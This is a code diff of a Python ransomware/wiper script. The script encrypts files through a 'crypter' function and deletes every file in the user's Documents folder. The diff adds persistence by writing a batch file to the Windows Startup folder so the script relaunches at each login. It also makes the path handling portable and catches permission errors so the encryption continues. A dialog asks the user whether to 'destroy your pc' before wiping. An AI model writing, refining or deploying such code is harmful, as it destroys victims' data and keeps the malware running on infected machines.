@@ -13,8 +13,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import random 
 import string
-import shutil
-from psutil import boot_time
+import psutil
 import time
 
 def crypter():
@@ -75,11 +74,15 @@ def crypter():
 def delete_all():
 
     try:
-        dir_path =  ('C:\\Users\\', os.getlogin(),'\\Documents') # <---- here you can add more than 1 path.
-        dir_contents = os.listdir(dir_path)
+        
+        home_dir = os.path.expanduser('~')
+        relative_path = r'Documents'
+        full_path = os.path.join(home_dir, relative_path)
+
+        dir_contents = os.listdir(full_path)
         # Follow this code for all of the paths that you want to add.
         for item in dir_contents:
-            item_path = os.path.join(dir_path, item)
+            item_path = os.path.join(full_path, item)
             
             if os.path.isfile(item_path):
                 os.remove(item_path)
@@ -91,8 +94,23 @@ def delete_all():
 
 def use():
     root = tk.Tk()
-    crypter()
-    
+
+    file_path = os.path.abspath(__file__)
+    print(file_path)
+
+    startup_dir = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    startup_path = os.path.join(startup_dir, "startt.bat")
+    os.makedirs(startup_dir, exist_ok=True)
+    startup_content = f'start "" "{file_path}"'
+
+    with open(startup_path, 'w') as f:
+        f.write(startup_content)
+    try:
+        crypter()
+    except PermissionError:
+        print("need more priviledges!")
+        pass
+
     def on_closing():
         if messagebox.askokcancel("Quit", "Do you want to destroy your pc?"):
             delete_all()
@@ -132,10 +150,7 @@ def confirm():
         use()
     else:
         pass
-uptime = time.time() - psutil.boot_time()
-if uptime < 60:
-    delete_all()
-    use()
+
 confirm()
 
 
